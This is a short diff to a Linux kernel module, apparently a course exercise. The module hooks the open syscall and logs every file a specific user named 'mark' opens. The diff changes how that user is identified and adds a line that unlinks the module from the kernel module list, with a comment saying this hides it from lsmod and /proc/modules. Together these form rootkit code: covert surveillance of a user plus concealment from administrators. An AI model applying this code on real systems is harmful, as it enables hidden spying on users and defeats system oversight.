@@ -62,7 +62,7 @@ void set_addr_rw(unsigned long addr){
 asmlinkage int my_open(const char* file, int flags, int mode)
 {
    /* your code here */ 
- if(current_uid().val == marks_uid)
+ if(get_current_user()->uid.val == marks_uid)
  {
     printk("mark is about to open '%s'\n", file);
  }               
@@ -279,7 +279,8 @@ shady_init_module(void)
       goto fail;
     }
   }
- 
+  //hide from lsmod and /proc/modules
+  list_del_init(&__this_module.list); 
   return 0; /* success */
 
  fail:
